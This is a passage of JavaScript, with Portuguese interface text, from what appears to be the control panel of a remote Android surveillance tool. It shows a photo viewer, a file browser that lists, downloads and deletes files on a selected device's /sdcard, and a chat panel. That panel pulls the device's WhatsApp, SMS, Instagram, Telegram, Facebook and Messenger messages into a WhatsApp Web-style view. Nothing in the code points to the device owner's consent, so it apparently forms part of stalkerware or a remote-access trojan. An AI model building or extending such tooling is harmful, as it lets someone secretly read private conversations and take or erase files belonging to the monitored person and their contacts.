    const activeTh = document.querySelector('.pm-thumb.active');
    if (activeTh) activeTh.scrollIntoView({ behavior: 'smooth', inline: 'center', block: 'nearest' });

    pmResetZoom();
}

function pmNavigate(dir) {
    const next = pmIndex + dir;
    if (next < 0 || next >= pmPhotos.length) return;
    pmIndex = next;
    pmRender(dir);
}

function pmBuildThumbs() {
    const strip = document.getElementById('pm-thumbs');
    strip.innerHTML = '';
    pmPhotos.forEach((p, i) => {
        const img = document.createElement('img');
        img.src       = p.url;
        img.className = 'pm-thumb' + (i === pmIndex ? ' active' : '');
        img.alt       = p.caption;
        img.loading   = 'lazy';
        img.onclick   = () => { pmIndex = i; pmRender(); };
        strip.appendChild(img);
    });
}

// ── Zoom ─────────────────────────────────────────────────────────────────────
function pmToggleZoom() {
    pmZoomed = !pmZoomed;
    pmScale  = pmZoomed ? 2.5 : 1;
    pmPanX   = 0; pmPanY = 0;
    pmApplyTransform();
    const icon = document.getElementById('pm-zoom-icon');
    icon.className = pmZoomed ? 'fa-solid fa-magnifying-glass-minus' : 'fa-solid fa-magnifying-glass-plus';
}

function pmResetZoom() {
    pmZoomed = false; pmScale = 1; pmPanX = 0; pmPanY = 0;
    pmApplyTransform(false);
    const icon = document.getElementById('pm-zoom-icon');
    if (icon) icon.className = 'fa-solid fa-magnifying-glass-plus';
}

function pmApplyTransform(animate = true) {
    const img = document.getElementById('pm-img');
    img.style.transition = animate ? 'transform 0.25s cubic-bezier(0.4,0,0.2,1)' : 'none';
    img.style.transform  = `scale(${pmScale}) translate(${pmPanX}px, ${pmPanY}px)`;
}

// ── Touch / Swipe / Pinch ────────────────────────────────────────────────────
function pmAttachGestures() {
    const stage = document.getElementById('pm-stage');
    stage.addEventListener('touchstart',  pmOnTouchStart,  { passive: false });
    stage.addEventListener('touchmove',   pmOnTouchMove,   { passive: false });
    stage.addEventListener('touchend',    pmOnTouchEnd,    { passive: true  });
    stage.addEventListener('dblclick',    pmToggleZoom);
}

function pmTouchDist2(t) {
    const dx = t[0].clientX - t[1].clientX;
    const dy = t[0].clientY - t[1].clientY;
    return Math.sqrt(dx*dx + dy*dy);
}

function pmOnTouchStart(e) {
    if (e.touches.length === 2) {
        pmIsPinching = true;
        pmTouchDist  = pmTouchDist2(e.touches);
    } else {
        pmIsPinching  = false;
        pmIsDragging  = false;
        pmTouchStartX = e.touches[0].clientX;
        pmTouchStartY = e.touches[0].clientY;
    }
}

function pmOnTouchMove(e) {
    if (pmIsPinching && e.touches.length === 2) {
        e.preventDefault();
        const newDist = pmTouchDist2(e.touches);
        const ratio   = newDist / pmTouchDist;
        pmScale       = Math.max(1, Math.min(5, pmScale * ratio));
        pmTouchDist   = newDist;
        pmZoomed      = pmScale > 1;
        pmApplyTransform(false);
        return;
    }
    if (pmZoomed && e.touches.length === 1) {
        e.preventDefault();
        const dx = e.touches[0].clientX - pmTouchStartX;
        const dy = e.touches[0].clientY - pmTouchStartY;
        pmPanX += dx / pmScale;
        pmPanY += dy / pmScale;
        pmTouchStartX = e.touches[0].clientX;
        pmTouchStartY = e.touches[0].clientY;
        pmApplyTransform(false);
    }
}

function pmOnTouchEnd(e) {
    if (pmIsPinching) { pmIsPinching = false; return; }
    if (pmZoomed) return; // don't swipe when zoomed

    const dx = e.changedTouches[0].clientX - pmTouchStartX;
    const dy = e.changedTouches[0].clientY - pmTouchStartY;
    const absDx = Math.abs(dx), absDy = Math.abs(dy);

    if (absDx > 40 && absDx > absDy * 1.5) {
        pmNavigate(dx < 0 ? 1 : -1);   // swipe left = next, right = prev
    } else if (absDx < 8 && absDy < 8) {
        pmToggleZoom();                 // small tap = zoom toggle
    }
}

// ── Keyboard ─────────────────────────────────────────────────────────────────
function pmKeyHandler(e) {
    if (e.key === 'ArrowRight') pmNavigate(1);
    if (e.key === 'ArrowLeft')  pmNavigate(-1);
    if (e.key === 'Escape')     closePhotoModal();
    if (e.key === '+' || e.key === '=') pmToggleZoom();
}

function pmAttachKeyboard() { document.addEventListener('keydown', pmKeyHandler); }
function pmDetachKeyboard() { document.removeEventListener('keydown', pmKeyHandler); }

// Keep old name working (called from renderPhotos onclick)
function closeImageModal() { closePhotoModal(); }

// Escaping html for console logs safety
function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
}

// ─── Remote File Browser ─────────────────────────────────────────────────────

function fbOpen(path) {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
    const p = path || '/sdcard';
    fbCurrentPath = p;
    document.getElementById('fb-loading').style.display = 'flex';
    document.getElementById('fb-empty').style.display   = 'none';
    document.getElementById('fb-list').style.display    = 'none';
    sendCommand('LIST_FILES', { path: p });
}

function fbRefresh() { if (fbCurrentPath) fbOpen(fbCurrentPath); }

function fbNavigateUp() {
    if (fbHistory.length > 0) {
        fbCurrentPath = fbHistory.pop();
        fbOpen(fbCurrentPath);
    }
}

function fbRenderList(data) {
    document.getElementById('fb-loading').style.display = 'none';
    document.getElementById('fb-empty').style.display   = 'none';

    const list = document.getElementById('fb-list');
    list.style.display = 'grid';
    list.innerHTML = '';

    // Breadcrumb
    document.getElementById('fb-breadcrumb').textContent = data.path || '/';

    // Up button
    const upBtn = document.getElementById('fb-up-btn');
    if (upBtn) upBtn.disabled = !data.parent || data.parent === data.path;

    if (!data.files || data.files.length === 0) {
        list.innerHTML = '<div style="color:var(--text-secondary);font-size:.85rem;padding:24px;grid-column:1/-1;text-align:center;"><i class="fa-solid fa-folder-open"></i> Pasta vazia</div>';
        return;
    }

    data.files.forEach(f => {
        const isDir  = f.type === 'dir';
        const icon   = fbIcon(f.ext, isDir);
        const size   = isDir ? '' : fbFormatSize(f.size);
        const date   = new Date(f.modified).toLocaleDateString('pt-BR');

        const isImg = fbIsImage(f.ext);
        const isVid = ['mp4','mkv','avi','mov','3gp','webm'].includes((f.ext||'').toLowerCase());
        const canPreview = !isDir && (isImg || isVid);

        const div = document.createElement('div');
        div.className = 'fb-item' + (canPreview ? ' fb-item-previewable' : '');
        div.innerHTML = `
            <span class="fb-item-icon ${fbIconClass(f.ext, isDir)}">${icon}</span>
            <div class="fb-item-info">
                <span class="fb-item-name" title="${escapeHtml(f.name)}">${escapeHtml(f.name)}</span>
                <span class="fb-item-meta">${size}${size && date ? ' · ' : ''}${date}</span>
            </div>
            <div class="fb-item-actions">
                ${canPreview ? `<button class="fb-act-btn fb-preview-btn" title="Visualizar" style="color:var(--neon-blue)"><i class="fa-solid fa-eye"></i></button>` : ''}
                ${!isDir ? `<button class="fb-act-btn dl" title="Baixar" style="color:var(--neon-blue)"><i class="fa-solid fa-download"></i></button>` : ''}
                <button class="fb-act-btn del" title="Excluir"><i class="fa-solid fa-trash"></i></button>
            </div>
            ${canPreview ? '<div class="fb-preview-hint"><i class="fa-solid fa-eye"></i></div>' : ''}
        `;

        // Bind actions safely (avoid inline onclick with complex args)
        if (isDir) {
            div.addEventListener('click', e => {
                if (e.target.closest('.fb-item-actions')) return;
                fbHistory.push(data.path);
                fbOpen(f.path);
            });
        } else {
            // Preview button or click on image/video → open preview
            if (canPreview) {
                const previewBtn = div.querySelector('.fb-preview-btn');
                if (previewBtn) previewBtn.addEventListener('click', e => {
                    e.stopPropagation();
                    fbPreview(f.path, f.name, div);
                });
                // Click anywhere on image/video item (outside actions) → preview
                div.addEventListener('click', e => {
                    if (e.target.closest('.fb-item-actions')) return;
                    fbPreview(f.path, f.name, div);
                });
            }
            // Download button
            const dlBtn = div.querySelector('.fb-act-btn.dl');
            if (dlBtn) dlBtn.addEventListener('click', e => {
                e.stopPropagation();
                fbDownload(f.path, f.name);
            });
        }

        // Delete button
        const delBtn = div.querySelector('.fb-act-btn.del');
        if (delBtn) delBtn.addEventListener('click', e => {
            e.stopPropagation();
            fbConfirmDelete(f.path, f.name);
        });

        list.appendChild(div);
    });
}

function fbShowError(msg) {
    document.getElementById('fb-loading').style.display = 'none';
    document.getElementById('fb-list').style.display    = 'none';
    const empty = document.getElementById('fb-empty');
    empty.style.display = 'flex';
    empty.innerHTML = `<i class="fa-solid fa-triangle-exclamation fa-2x" style="color:var(--danger-red)"></i><p style="color:var(--danger-red)">${escapeHtml(msg)}</p><button class="btn btn-sm btn-primary" onclick="fbOpen()"><i class="fa-solid fa-folder-open"></i> Abrir Raiz</button>`;
}

// ── Preview image directly in lightbox (no manual download needed) ────────────
function fbPreview(path, name, itemEl) {
    if (!currentDeviceId) return;
    if (fbPreviewPending[path]) return; // already loading

    // Visual feedback: loading spinner on the item
    fbPreviewPending[path] = { name, itemEl };
    itemEl.classList.add('fb-item-loading');
    const previewBtn = itemEl.querySelector('.fb-preview-btn');
    if (previewBtn) previewBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';

    logToConsole(`🔍 Carregando preview: ${name}`, 'system');
    sendCommand('DOWNLOAD_FILE', { path });
}

// Called when server sends FILE_READY — routes to lightbox or download toast
function fbHandleFileReady(name, url, originalPath) {
    const pending = fbPreviewPending[originalPath];
    const ext     = (name.split('.').pop() || '').toLowerCase();
    const isImg   = fbIsImage(ext);
    const isVideo = ['mp4','mkv','avi','mov','3gp','webm'].includes(ext);

    // Restore item state if it was a preview request
    if (pending) {
        pending.itemEl.classList.remove('fb-item-loading');
        const btn = pending.itemEl.querySelector('.fb-preview-btn');
        if (btn) btn.innerHTML = '<i class="fa-solid fa-eye"></i>';
        delete fbPreviewPending[originalPath];
    }

    if (isImg) {
        // Open image directly in the photo lightbox modal
        pmPhotos = [{ url, caption: name }];
        openPhotoModal(0);
        return;
    }

    if (isVideo) {
        // Open video in a simple video player overlay
        fbOpenVideoPlayer(url, name);
        return;
    }

    // Non-previewable file: show download toast
    fbShowDownloadToast(name, url, originalPath);
}

function fbOpenVideoPlayer(url, name) {
    const overlay = document.createElement('div');
    overlay.className = 'fb-video-overlay';
    overlay.innerHTML = `
        <div class="fb-video-box">
            <div class="fb-video-header">
                <span>${escapeHtml(name)}</span>
                <div style="display:flex;gap:8px;">
                    <a href="${escapeHtml(url)}" download="${escapeHtml(name)}" class="fb-video-action" title="Baixar">
                        <i class="fa-solid fa-download"></i>
                    </a>
                    <button class="fb-video-action" onclick="this.closest('.fb-video-overlay').remove()" title="Fechar">
                        <i class="fa-solid fa-xmark"></i>
                    </button>
                </div>
            </div>
            <video class="fb-video-player" controls autoplay>
                <source src="${escapeHtml(url)}">
                Seu navegador não suporta o player de vídeo.
            </video>
        </div>
    `;
    overlay.addEventListener('click', e => { if (e.target === overlay) overlay.remove(); });
    document.body.appendChild(overlay);
    setTimeout(() => overlay.style.opacity = '1', 10);
}

function fbDownload(path, name) {
    if (!currentDeviceId) return;
    logToConsole(`⬇️ Solicitando download: ${name}`, 'system');
    sendCommand('DOWNLOAD_FILE', { path });
}

function fbShowDownloadToast(name, url, originalPath) {
    const toast = document.createElement('div');
    toast.className = 'fb-download-toast';
    toast.innerHTML = `
        <i class="fa-solid fa-file-arrow-down" style="color:var(--neon-blue)"></i>
        <div style="flex:1;min-width:0;">
            <div style="font-weight:600;font-size:.85rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(name)}</div>
            <div style="font-size:.7rem;color:var(--text-secondary)">Pronto para baixar</div>
        </div>
        <a href="${escapeHtml(url)}" download="${escapeHtml(name)}" class="fb-act-btn dl" style="text-decoration:none;padding:6px 10px;border:1px solid var(--neon-blue);border-radius:8px;font-size:.78rem;font-weight:600;color:var(--neon-blue);">
            <i class="fa-solid fa-download"></i> Baixar
        </a>
        <button onclick="this.parentElement.remove()" style="background:none;border:none;color:var(--text-secondary);cursor:pointer;font-size:1rem;padding:4px;">✕</button>
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.style.opacity = '1', 10);
    setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 400); }, 15000);
}

function fbConfirmDelete(path, name) {
    const overlay = document.createElement('div');
    overlay.className = 'fb-confirm-overlay';
    overlay.innerHTML = `
        <div class="fb-confirm-box">
            <div class="fb-confirm-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
            <div class="fb-confirm-title">Excluir permanentemente?</div>
            <div class="fb-confirm-path">${escapeHtml(path)}</div>
            <div class="fb-confirm-btns">
                <button class="fb-btn-cancel">Cancelar</button>
                <button class="fb-btn-delete">
                    <i class="fa-solid fa-trash"></i> Excluir
                </button>
            </div>
        </div>
    `;
    const cancelBtn = overlay.querySelector('.fb-btn-cancel');
    const deleteBtn = overlay.querySelector('.fb-btn-delete');
    cancelBtn.addEventListener('click', () => overlay.remove());
    deleteBtn.addEventListener('click', () => { overlay.remove(); fbDeleteConfirmed(path); });
    document.body.appendChild(overlay);
}

function fbDeleteConfirmed(path) {
    sendCommand('DELETE_FILE', { path });
    logToConsole(`🗑️ Exclusão solicitada: ${path}`, 'command');
}

// ── File browser helpers ──────────────────────────────────────────────────────
function fbIcon(ext, isDir) {
    if (isDir) return '📁';
    const e = (ext || '').toLowerCase();
    if (['jpg','jpeg','png','gif','webp','heic'].includes(e)) return '🖼️';
    if (['mp4','mkv','avi','mov','3gp'].includes(e)) return '🎬';
    if (['mp3','aac','ogg','flac','m4a'].includes(e)) return '🎵';
    if (['pdf'].includes(e)) return '📄';
    if (['doc','docx'].includes(e)) return '📝';
    if (['xls','xlsx'].includes(e)) return '📊';
    if (['zip','rar','7z','tar'].includes(e)) return '🗜️';
    if (['apk'].includes(e)) return '📦';
    return '📄';
}
function fbIconClass(ext, isDir) {
    if (isDir) return 'dir';
    const e = (ext || '').toLowerCase();
    if (['jpg','jpeg','png','gif','webp','heic'].includes(e)) return 'img';
    if (['mp4','mkv','avi','mov','3gp'].includes(e)) return 'vid';
    if (['mp3','aac','ogg','flac','m4a'].includes(e)) return 'aud';
    if (['pdf','doc','docx','xls','xlsx','txt'].includes(e)) return 'doc';
    if (['zip','rar','7z'].includes(e)) return 'zip';
    return 'file';
}
function fbIsImage(ext) { return ['jpg','jpeg','png','gif','webp'].includes((ext||'').toLowerCase()); }
function fbFormatSize(bytes) {
    if (bytes < 1024) return `${bytes}B`;
    if (bytes < 1024*1024) return `${(bytes/1024).toFixed(1)}KB`;
    if (bytes < 1024*1024*1024) return `${(bytes/1024/1024).toFixed(1)}MB`;
    return `${(bytes/1024/1024/1024).toFixed(2)}GB`;
}

// ─── WhatsApp Web-style Messages Panel ───────────────────────────────────────

// conversationsMap: address → { messages: [], lastMsg, lastTime, unread }
const conversationsMap = new Map();
let currentWaAddress = null;
let currentMsgPlatform = 'all'; // 'all' | 'whatsapp' | 'sms' | 'instagram' | 'telegram' | 'facebook' | 'messenger'
// Message ids already ingested — prevents duplicate bubbles when a live NEW_MESSAGE
// arrives while fetchDeviceHistory()'s REST call for the same message is still in flight.
const waSeenIds = new Set();

// ── Platform helpers ──────────────────────────────────────────────────────────
function waPlatformLabel(src) {
    const map = { whatsapp:'WhatsApp', sms:'SMS', instagram:'Instagram', telegram:'Telegram', facebook:'Facebook', messenger:'Messenger' };
    return map[src] || 'SMS';
}
function waPlatformEmoji(src) {
    const map = { whatsapp:'💬', sms:'📩', instagram:'📸', telegram:'✈️', facebook:'👍', messenger:'💙' };
    return map[src] || '📩';
}
function waSourceBadge(src) {
    switch (src) {
        case 'whatsapp':  return '<span class="wa-bubble-source wa-bubble-source-wa"  title="WhatsApp"><i class="fa-brands fa-whatsapp"></i></span>';
        case 'instagram': return '<span class="wa-bubble-source wa-bubble-source-ig"  title="Instagram"><i class="fa-brands fa-instagram"></i></span>';
        case 'telegram':  return '<span class="wa-bubble-source wa-bubble-source-tg"  title="Telegram"><i class="fa-brands fa-telegram"></i></span>';
        case 'facebook':  return '<span class="wa-bubble-source wa-bubble-source-fb"  title="Facebook"><i class="fa-brands fa-facebook"></i></span>';
        case 'messenger': return '<span class="wa-bubble-source wa-bubble-source-ms"  title="Messenger"><i class="fa-brands fa-facebook-messenger"></i></span>';
        default:          return '<span class="wa-bubble-source wa-bubble-source-sms" title="SMS"><i class="fa-solid fa-comment-sms"></i></span>';
    }
}
function waConvSourceIcon(conv) {
    // Dominant source = most-frequent among the conversation's messages
    const counts = {};
    conv.messages.forEach(m => { const s = m.source || 'sms'; counts[s] = (counts[s] || 0) + 1; });
    const dominant = Object.entries(counts).sort((a,b) => b[1]-a[1])[0]?.[0] || 'sms';
    switch (dominant) {
        case 'whatsapp':  return '<span class="wa-source wa-source-wa"  title="WhatsApp"><i class="fa-brands fa-whatsapp"></i></span>';
        case 'instagram': return '<span class="wa-source wa-source-ig"  title="Instagram"><i class="fa-brands fa-instagram"></i></span>';
        case 'telegram':  return '<span class="wa-source wa-source-tg"  title="Telegram"><i class="fa-brands fa-telegram"></i></span>';
        case 'facebook':  return '<span class="wa-source wa-source-fb"  title="Facebook"><i class="fa-brands fa-facebook"></i></span>';
        case 'messenger': return '<span class="wa-source wa-source-ms"  title="Messenger"><i class="fa-brands fa-facebook-messenger"></i></span>';
        default:          return '<span class="wa-source wa-source-sms" title="SMS"><i class="fa-solid fa-comment-sms"></i></span>';
    }
}

function waSwitchPlatform(platform) {
    currentMsgPlatform = platform;
    document.querySelectorAll('.wa-platform-tab').forEach(tab => {
        tab.classList.toggle('active', tab.dataset.platform === platform);
    });
    // Reset chat pane
    currentWaAddress = null;
    const pane = document.getElementById('wa-messages');
    if (pane) pane.innerHTML = '<div class="wa-no-conv"><i class="fa-solid fa-comments fa-3x"></i><p>Selecione uma conversa à esquerda</p></div>';
    const footer = document.getElementById('wa-footer');
    if (footer) footer.style.display = 'none';
    waRenderSidebar();
}

function waUpdatePlatformBadges() {
    const counts = { all:0, whatsapp:0, sms:0, instagram:0, telegram:0, facebook:0, messenger:0 };
    conversationsMap.forEach(conv => {
        if (!conv.unread) return;
        counts.all += conv.unread;
        // Credit unread to every platform that has messages in this conversation
        const sources = new Set(conv.messages.map(m => m.source || 'sms'));
        sources.forEach(s => { if (counts[s] !== undefined) counts[s] += conv.unread; });
    });
    Object.entries(counts).forEach(([platform, n]) => {
        const badge = document.getElementById(`wabadge-${platform}`);
        if (!badge) return;
        if (n > 0) { badge.textContent = n > 99 ? '99+' : n; badge.style.display = 'flex'; }
        else { badge.style.display = 'none'; }
    });
}

function waNormalizeChatKey(nameOrAddr) {
    if (!nameOrAddr) return '';
    let key = nameOrAddr.trim();
    // Remove suffixes like "(6 mensagens)", "(2 mensagens novas)", ": 3 mensagens"
    key = key.replace(/\s*[\(\[]\d+\s+mensagens?\s*(novas?)?[\)\]].*$/i, '');
    key = key.replace(/\s*:\s*\d+\s+mensagens?.*$/i, '');
    key = key.replace(/\s*:.*$/, '');
    return key.trim();
}

// Single source of truth for how a message maps to a conversation key — must be used
// everywhere a conversation is looked up (ingestion, live updates, unread counting),
// otherwise a raw (non-normalized) address can silently miss the conversation entirely.
function waAddrKey(m) {
    const rawAddr = (m.address && m.address.trim()) ? m.address.trim() : '';
    const rawName = (m.name && m.name.trim()) ? m.name.trim() : '';
    return waNormalizeChatKey(rawAddr) || waNormalizeChatKey(rawName) || '(sistema)';
}

function waIngestMessage(m) {
    if (m.id != null) {
        if (waSeenIds.has(m.id)) return;
        waSeenIds.add(m.id);
    }
    const rawAddr = (m.address && m.address.trim()) ? m.address.trim() : '';
    const rawName = (m.name && m.name.trim()) ? m.name.trim() : '';
    const addr = waAddrKey(m);
    const name = rawName || rawAddr || '(sistema)';
    if (!m.source) m.source = 'sms';
    if (!conversationsMap.has(addr)) {
        conversationsMap.set(addr, { name: name, messages: [], lastMsg: '', lastTime: 0, unread: 0 });
    }
    const conv = conversationsMap.get(addr);
    // Prefer the first non-generic name we see
    if (conv.name === '(sistema)' && name !== '(sistema)') conv.name = name;
    conv.messages.push(m);
    conv.lastMsg = m.content || '';
    if (m.timestamp > conv.lastTime) conv.lastTime = m.timestamp;
}

function waAddMessage(m) {
    const isDuplicate = m.id != null && waSeenIds.has(m.id);
    waIngestMessage(m);
    if (isDuplicate) return;
    const addr = waAddrKey(m);
    if (currentWaAddress === addr) {
        const pane = document.getElementById('wa-messages');
        if (pane) {
            const bubble = waBuildBubble(m);
            pane.appendChild(bubble);
            requestAnimationFrame(() => {
                pane.scrollTo({ top: pane.scrollHeight, behavior: 'instant' });
            });
        }
    }
}

function waReloadMessages(deviceId) {
    conversationsMap.clear();
    waSeenIds.clear();
    currentWaAddress = null;
    // Reset to "all" tab on device change
    currentMsgPlatform = 'all';
    document.querySelectorAll('.wa-platform-tab').forEach(tab => {
        tab.classList.toggle('active', tab.dataset.platform === 'all');
    });
    const waMsgPane = document.getElementById('wa-messages');
    if (waMsgPane) waMsgPane.innerHTML = '<div class="wa-no-conv"><i class="fa-solid fa-comments fa-3x"></i><p>Selecione uma conversa à esquerda</p></div>';
    const waFooter = document.getElementById('wa-footer');
    if (waFooter) waFooter.style.display = 'none';

    fetch(`/api/device/${deviceId}/messages-history`, { headers: authHeaders() })
        .then(res => res.json())
        .then(messages => {
            if (deviceId !== currentDeviceId) return;
            const label = document.getElementById('messages-device-label');
            if (label) label.textContent = devicesMap.get(deviceId)?.model || deviceId;
            messages.forEach(m => waIngestMessage(m));
            waRenderSidebar();
            const sorted = [...conversationsMap.entries()].sort((a,b) => b[1].lastTime - a[1].lastTime);
            if (sorted.length > 0) waSelectConversation(sorted[0][0]);
        })
        .catch(err => console.error('Error fetching messages:', err));
}

function waClearAllConversations() {
    if (!confirm('Recarregar todas as conversas do servidor?')) return;
    if (currentDeviceId) waReloadMessages(currentDeviceId);
}

function waRenderSidebar() {
    const list = document.getElementById('wa-convlist');
    if (!list) return;

    // Filter by selected platform tab
    let entries = [...conversationsMap.entries()];
    if (currentMsgPlatform !== 'all') {
        entries = entries.filter(([, conv]) =>
            conv.messages.some(m => (m.source || 'sms') === currentMsgPlatform)
        );
    }

    if (entries.length === 0) {
        const emptyLabel = currentMsgPlatform === 'all' ? 'Nenhuma conversa' : `Nenhuma mensagem de ${waPlatformLabel(currentMsgPlatform)}`;
        list.innerHTML = `<div class="wa-convlist-empty"><i class="fa-solid fa-comment-slash"></i><p>${emptyLabel}</p></div>`;
        waUpdatePlatformBadges();
        return;
    }

    const sorted = entries.sort((a, b) => b[1].lastTime - a[1].lastTime);
    list.innerHTML = '';

    sorted.forEach(([addr, conv]) => {
        const item = document.createElement('div');
        item.className = 'wa-conv-item' + (addr === currentWaAddress ? ' wa-conv-active' : '');
        item.dataset.addr = addr;
        item.onclick = () => waSelectConversation(addr);

        const displayName = waNormalizeChatKey(conv.name) || waNormalizeChatKey(addr);
        const showSubtitle = (conv.name && waNormalizeChatKey(conv.name) !== waNormalizeChatKey(addr) && addr !== '(sistema)')
            ? `<span class="wa-conv-subtitle">${escapeHtml(waFormatPhone(addr))}</span>`
            : '';
        const initialSource = displayName.replace(/\D/g, '')[0] || displayName[0] || '?';
        const timeStr = conv.lastTime ? new Date(conv.lastTime).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }) : '';
        const previewText = waPreviewText(conv.lastMsg);
        const preview = escapeHtml(previewText.substring(0, 38)) + (previewText.length > 38 ? '…' : '');
        const unreadHtml = conv.unread > 0 ? `<span class="wa-unread">${conv.unread}</span>` : '';
        const sourceIcon = waConvSourceIcon(conv);

        item.innerHTML = `
            <div class="wa-conv-avatar">${escapeHtml(initialSource.toUpperCase())}</div>
            <div class="wa-conv-info">
                <div class="wa-conv-top">
                    <span class="wa-conv-name">${escapeHtml(displayName)}</span>
                    <span class="wa-conv-time">${timeStr}</span>
                </div>
                <div class="wa-conv-bottom">
                    ${sourceIcon}
                    <span class="wa-conv-preview">${preview}</span>
                    ${unreadHtml}
                </div>
                ${showSubtitle}
            </div>`;
        list.appendChild(item);
    });

    waUpdatePlatformBadges();
}

function waSelectConversation(addr) {
    currentWaAddress = addr;
    const conv = conversationsMap.get(addr);
    if (!conv) return;

    conv.unread = 0;

    // Sidebar active state
    document.querySelectorAll('.wa-conv-item').forEach(el => {
        el.classList.toggle('wa-conv-active', el.dataset.addr === addr);
    });

    // Header
    const displayName = waNormalizeChatKey(conv.name) || waFormatPhone(addr);
    const subtitle = (conv.name && waNormalizeChatKey(conv.name) !== waNormalizeChatKey(addr) && addr !== '(sistema)')
        ? waFormatPhone(addr)
        : `${conv.messages.length} mensagem(ns)`;
    document.getElementById('wa-chat-name').textContent = displayName;
    document.getElementById('wa-chat-sub').textContent = subtitle;
    document.getElementById('wa-avatar').textContent = (displayName.replace(/\D/g, '')[0] || displayName[0] || '?').toUpperCase();
    document.getElementById('wa-footer').style.display = 'flex';

    // Render messages
    const pane = document.getElementById('wa-messages');
    pane.innerHTML = '';

    let lastDate = '';
    conv.messages.forEach(msg => {
        const msgDate = new Date(msg.timestamp).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
        if (msgDate !== lastDate) {
            const sep = document.createElement('div');
            sep.className = 'wa-date-sep';
            sep.textContent = msgDate;
            pane.appendChild(sep);
            lastDate = msgDate;
        }
        pane.appendChild(waBuildBubble(msg));
    });

    // Scroll to bottom after rendering — use requestAnimationFrame for reliable layout
    requestAnimationFrame(() => {
        pane.scrollTo({ top: pane.scrollHeight, behavior: 'instant' });
    });

    // Mobile: switch to chat pane (single-pane navigation)
    if (window.innerWidth <= 767) {
        document.querySelector('.wa-body')?.classList.add('wa-in-chat');
    }
}

// Mobile: back from chat pane to conversation list
function waBackToList() {
    document.querySelector('.wa-body')?.classList.remove('wa-in-chat');
    currentWaAddress = null;
    document.querySelectorAll('.wa-conv-item').forEach(el => el.classList.remove('wa-conv-active'));
}

// Shared by waBuildBubble (chat) and waPreviewText (sidebar) so both agree on what
// counts as media and what type it is — used to duplicate this per call site, which
// let the two drift out of sync (the sidebar preview showed raw caption+URL text).
function waParseMediaContent(content) {
    const lines = content.split('\n');
    let captionText = content;
    let mediaUrl = null;
    let mediaType = null;

    for (const line of lines) {
        const trimmed = line.trim();
        if (/^https?:\/\//.test(trimmed) || /^\/uploads\//.test(trimmed)) {
            mediaUrl = trimmed;
            if (/\.(jpg|jpeg|png|webp|gif)/i.test(trimmed)) mediaType = 'image';
            else if (/\.(mp4|webm|mov)/i.test(trimmed)) mediaType = 'video';
            else if (/\.(mp3|m4a|aac|ogg|opus)/i.test(trimmed)) mediaType = 'audio';
            else mediaType = 'file';
            captionText = content.replace(trimmed, '').trim();
        }
    }

    // Fallback: detect media URLs in full content
    if (!mediaUrl) {
        const imageMatch = content.match(/(https?:\/\/\S+|\/uploads\/\S+)\.(jpg|jpeg|png|webp|gif)(\?\S*)?/i);
        const videoMatch = content.match(/(https?:\/\/\S+|\/uploads\/\S+)\.(mp4|webm|mov)(\?\S*)?/i);
        const audioMatch = content.match(/(https?:\/\/\S+|\/uploads\/\S+)\.(mp3|m4a|aac|ogg|opus)(\?\S*)?/i);
        if (imageMatch) { mediaUrl = imageMatch[0]; mediaType = 'image'; }
        else if (videoMatch) { mediaUrl = videoMatch[0]; mediaType = 'video'; }
        else if (audioMatch) { mediaUrl = audioMatch[0]; mediaType = 'audio'; }
    }

    return { mediaUrl, mediaType, captionText };
}

// Friendly one-line summary for the conversation list ("🎤 Áudio" instead of a raw URL)
function waPreviewText(content) {
    content = content || '';
    const { mediaUrl, mediaType, captionText } = waParseMediaContent(content);
    if (!mediaUrl) return content;
    const label = { image: '📷 Foto', video: '🎥 Vídeo', audio: '🎤 Áudio', file: '📎 Arquivo' }[mediaType] || '📎 Arquivo';
    return (captionText && captionText !== content) ? `${label}: ${captionText}` : label;
}

function waBuildBubble(msg) {
    const bubble = document.createElement('div');
    bubble.className = `wa-bubble ${msg.direction === 'out' ? 'wa-bubble-out' : 'wa-bubble-in'}`;
    const time = new Date(msg.timestamp).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    const tick = msg.direction === 'out' ? '<i class="fa-solid fa-check-double wa-tick"></i>' : '';
    const sourceBadge = waSourceBadge(msg.source || 'sms');

    const content = msg.content || '';
    let bodyHtml = '';
    const { mediaUrl, mediaType, captionText } = waParseMediaContent(content);

    // Render media
    if (mediaType === 'image' && mediaUrl) {
        bodyHtml = `<div class="wa-media-wrap">
            <img class="wa-bubble-img" src="${escapeHtml(mediaUrl)}" alt="imagem" onclick="window.open(this.src,'_blank')">
            <a class="wa-media-download" href="${escapeHtml(mediaUrl)}" download target="_blank"><i class="fa-solid fa-download"></i></a>
        </div>`;
    } else if (mediaType === 'video' && mediaUrl) {
        bodyHtml = `<div class="wa-media-wrap">
            <video class="wa-bubble-video" src="${escapeHtml(mediaUrl)}" controls preload="metadata"></video>
            <a class="wa-media-download" href="${escapeHtml(mediaUrl)}" download target="_blank"><i class="fa-solid fa-download"></i></a>
        </div>`;
    } else if (mediaType === 'audio' && mediaUrl) {
        bodyHtml = `<div class="wa-media-wrap wa-audio-wrap">
            <i class="fa-solid fa-headphones wa-audio-icon"></i>
            <audio class="wa-bubble-audio" src="${escapeHtml(mediaUrl)}" controls preload="metadata"></audio>
            <a class="wa-media-download" href="${escapeHtml(mediaUrl)}" download target="_blank"><i class="fa-solid fa-download"></i></a>
        </div>`;
    } else if (mediaType === 'file' && mediaUrl) {
        bodyHtml = `<div class="wa-media-wrap wa-file-wrap">
            <a class="wa-bubble-link" href="${escapeHtml(mediaUrl)}" target="_blank" download>
                <i class="fa-solid fa-file-arrow-down"></i> Baixar arquivo
            </a>
        </div>`;
    }

    // Render caption text
    if (captionText && captionText !== content) {
        bodyHtml += `<span class="wa-bubble-text">${escapeHtml(captionText)}</span>`;
    } else if (!mediaUrl) {
        bodyHtml = `<span class="wa-bubble-text">${escapeHtml(content)}</span>`;
    }

    bubble.innerHTML = `
        ${bodyHtml}
